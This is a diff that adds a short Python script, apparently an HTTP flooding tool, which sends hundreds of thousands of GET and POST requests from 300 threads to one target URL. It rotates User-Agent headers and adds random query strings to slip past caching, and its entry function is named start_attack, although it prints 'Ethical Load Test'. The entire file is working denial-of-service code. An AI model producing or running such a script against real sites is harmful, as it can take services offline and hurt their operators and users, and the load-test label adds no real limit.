@@ -1,0 +1,50 @@
+import requests
+import threading
+import random
+import time
+
+TARGET_URL = "http://yourwebsite.com"  # Replace with your test server URL
+THREADS = 100  # Number of concurrent threads
+LAYER1_COUNT = 1000
+LAYER2_COUNT = 500
+LAYER3_COUNT = 200
+
+HEADERS_LIST = [
+    {'User-Agent': 'Mozilla/5.0'},
+    {'User-Agent': 'Chrome/90.0'},
+    {'User-Agent': 'Safari/537.36'}
+]
+
+def layer1():
+    for _ in range(LAYER1_COUNT):
+        try:
+            response = requests.get(TARGET_URL, headers=random.choice(HEADERS_LIST))
+            print(f"[Layer 1] Status: {response.status_code}")
+        except Exception as e:
+            print(f"[Layer 1] Error: {e}")
+
+def layer2():
+    for _ in range(LAYER2_COUNT):
+        try:
+            response = requests.post(TARGET_URL, data={'data': random.random()}, headers=random.choice(HEADERS_LIST))
+            print(f"[Layer 2] Status: {response.status_code}")
+        except Exception as e:
+            print(f"[Layer 2] Error: {e}")
+
+def layer3():
+    for _ in range(LAYER3_COUNT):
+        try:
+            response = requests.get(TARGET_URL + f"?q={random.random()}", headers=random.choice(HEADERS_LIST))
+            print(f"[Layer 3] Status: {response.status_code}")
+        except Exception as e:
+            print(f"[Layer 3] Error: {e}")
+
+def start_attack():
+    for _ in range(THREADS):
+        threading.Thread(target=layer1).start()
+        threading.Thread(target=layer2).start()
+        threading.Thread(target=layer3).start()
+
+if __name__ == "__main__":
+    print("Starting Ethical Load Test...")
+    start_attack()
